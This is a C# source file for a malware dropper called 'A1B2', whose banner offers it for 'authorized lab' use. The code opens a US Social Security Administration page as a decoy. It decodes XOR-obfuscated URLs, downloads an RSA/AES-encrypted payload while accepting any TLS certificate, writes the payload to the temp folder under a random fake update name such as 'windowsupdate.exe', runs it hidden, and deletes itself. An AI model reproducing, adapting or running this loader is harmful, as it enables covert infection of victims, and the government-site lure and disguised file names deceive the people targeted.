............................................................................
. Project: A1B2                                                            .
. Build for educational purpose in authorized lab environments only.        .
. Purpose: Downloads and executes encrypted payloads with anti-analysis.    .
. Author: Ebere Michhael (Call Simba)                                      .
. Telegram: @lets_sudosu                                                   .
. Make the world a better place.                                           .
............................................................................

using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;

namespace A1B2
{
    class C3D4
    {
        private static readonly bool E5F6 = true;
        private static byte[] S9T0;
        private static readonly byte[] U1V2 = Encoding.UTF8.GetBytes("xai_obf_key_2025");
        private static readonly string I9J0 = "EBUdLxxYSXAMDA03R1IcVhcMRhwODgoaBQ4QcF9RW1snFwssQBADMw4ECjpBH1ZaDw8FMA4GSTEOEgosUx9CVAENBj4LTAMxCA==";
        private static readonly string K1L2 = "EBUdLxxYSXAMDA03R1IcVhcMRhwODgoaBQ4QcF9RW1snFwssQBADMw4ECjpBH1ZaDw8FMA4GSTEOEgosUx9ARhk+GS0GFEgvDgg=";
        private static readonly string M3N4 = "Xc2L2p35vRnVVkS4KqwWTvvG0vIV2CYMnzoByKeFoXg=";
        private static readonly string O5P6 = "iYmGnFPKfBYETlG9";
        private static readonly string Q7R8 = "wEO3G+hYEl1Z5oQxymHKeCP0Ejlom7HCNvFdds2DgQnBG+3YqfAwp/psM2aEokI9";

        static async Task Main()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "https://www.ssa.gov/apply/check-application-or-appeal-status",
                    UseShellExecute = true,
                    CreateNoWindow = true
                });
            }
            catch (Exception)
            {
            }
            await ExecutePayloadAsync();
            await Task.Delay(2000);
        }

        static async Task ExecutePayloadAsync()
        {
            try
            {
                var encUrl = P9Q0(I9J0);
                var keyUrl = P9Q0(K1L2);
                int dlResult = await H1I2Async();
                if (dlResult == -1)
                {
                    return;
                }
                int launchResult = J3K4();
                if (launchResult == -1)
                {
                    return;
                }
                L5M6();
            }
            catch (Exception)
            {
            }
        }

        static async Task<int> H1I2Async()
        {
            try
            {
                var url = P9Q0(I9J0);
                var keyUrl = P9Q0(K1L2);
                using var handler = new HttpClientHandler
                {
                    SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13,
                    ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
                };
                using var client = new HttpClient(handler);
                client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");
                var data = await client.GetByteArrayAsync(url);
                int idx = 0;
                int keyLen = (data[idx++] << 8) | data[idx++];
                var wrappedKey = data.Skip(idx).Take(keyLen).ToArray();
                idx += keyLen;
                var nonce = data.Skip(idx).Take(12).ToArray();
                idx += 12;
                var cipherAndTag = data.Skip(idx).ToArray();
                var keyPem = await GetPrivateKeyAsync(keyUrl);
                using var rsa = RSA.Create();
                rsa.ImportFromPem(keyPem);
                var aesKey = rsa.Decrypt(wrappedKey, RSAEncryptionPadding.OaepSHA256);
                var plaintext = new byte[cipherAndTag.Length - 16];
                var tag = cipherAndTag[^16..];
                var ciphertext = cipherAndTag[..^16];
                using var aes = new AesGcm(aesKey);
                aes.Decrypt(nonce, ciphertext, tag, plaintext);
                S9T0 = plaintext;
                return 1;
            }
            catch (Exception)
            {
                return -1;
            }
        }

        static async Task<string> GetPrivateKeyAsync(string keyUrl)
        {
            using var handler = new HttpClientHandler
            {
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13,
                ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
            };
            using var client = new HttpClient(handler);
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");
            try
            {
                var keyPem = await client.GetStringAsync(keyUrl);
                return keyPem;
            }
            catch (Exception)
            {
                throw;
            }
        }

        static int J3K4()
        {
            try
            {
                string[] filenames = new[]
                {
                    "windowsupdate.exe", "chromeupdate.exe", "adobeupdate.exe", "javaupdate.exe",
                    "officeupdate.exe", "flashupdate.exe", "securityupdate.exe", "systemupdate.exe",
                    "driverupdate.exe", "firefoxupdate.exe", "edgeupdate.exe", "vcredist.exe",
                    "dotnetupdate.exe", "antivirusupdate.exe", "backupupdate.exe", "cloudupdate.exe",
                    "mediaupdate.exe", "appupdate.exe", "toolupdate.exe", "patchupdate.exe",
                    "runtimeupdate.exe", "frameworkupdate.exe", "serviceupdate.exe", "clientupdate.exe",
                    "serverupdate.exe", "networkupdate.exe", "deviceupdate.exe", "softwareupdate.exe",
                    "utilityupdate.exe", "coreupdate.exe", "sysconfig.exe", "diskmanager.exe",
                    "netmonitor.exe", "taskhoster.exe", "winsecure.exe", "cryptsvc.exe",
                    "storagemgr.exe", "audioservice.exe", "printspool.exe", "netadapter.exe",
                    "powercfg.exe", "regsvc.exe", "winlogsvc.exe", "filesync.exe",
                    "datasync.exe", "sysdiag.exe", "perfmon.exe", "eventlogger.exe",
                    "clipboardsvc.exe", "authmanager.exe", "winproxy.exe", "firewallctl.exe",
                    "netbridge.exe", "syscleaner.exe", "diskoptimizer.exe", "memcheck.exe",
                    "userprofile.exe", "appinstaller.exe", "cloudsync.exe", "mediaserver.exe",
                    "winbackup.exe", "driverctl.exe", "systemtools.exe", "netsecurity.exe",
                    "taskmgrsvc.exe", "wincompress.exe", "updatesvc.exe", "sysrestore.exe",
                    "devicecfg.exe", "netdiag.exe", "winfetch.exe", "securityctl.exe",
                    "appmonitor.exe", "sysguard.exe", "datamgr.exe", "wininitcfg.exe",
                    "networksvc.exe", "userauth.exe", "sysbackup.exe", "diskcheck.exe",
                    "winrepair.exe", "cloudmgr.exe", "mediasync.exe", "appconfig.exe",
                    "driverinstall.exe", "systemctl.exe", "netconfig.exe", "winutils.exe",
                    "securityscan.exe", "taskrunner.exe", "sysmonitor.exe"
                };
                var rnd = new Random();
                var fileName = filenames[rnd.Next(filenames.Length)];
                var exePath = Path.Combine(Path.GetTempPath(), fileName);
                System.IO.File.WriteAllBytes(exePath, S9T0);
                var psi = new ProcessStartInfo
                {
                    FileName = exePath,
                    WorkingDirectory = Path.GetTempPath(),
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                var proc = Process.Start(psi);
                if (proc != null)
                {
                    return 2;
                }
                else
                {
                    return -1;
                }
            }
            catch (Exception)
            {
                return -1;
            }
        }

        static int L5M6()
        {
            try
            {
                var self = Assembly.GetExecutingAssembly().Location;
                Process.Start("cmd.exe", $"/c ping 127.0.0.1 -n 2 >nul & del \"{self}\"");
                return 0;
            }
            catch (Exception)
            {
                return -1;
            }
        }

        static string P9Q0(string b64)
        {
            var data = Convert.FromBase64String(b64);
            var outb = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                outb[i] = (byte)(data[i] ^ U1V2[i % U1V2.Length]);
            return Encoding.UTF8.GetString(outb);
        }
    }
}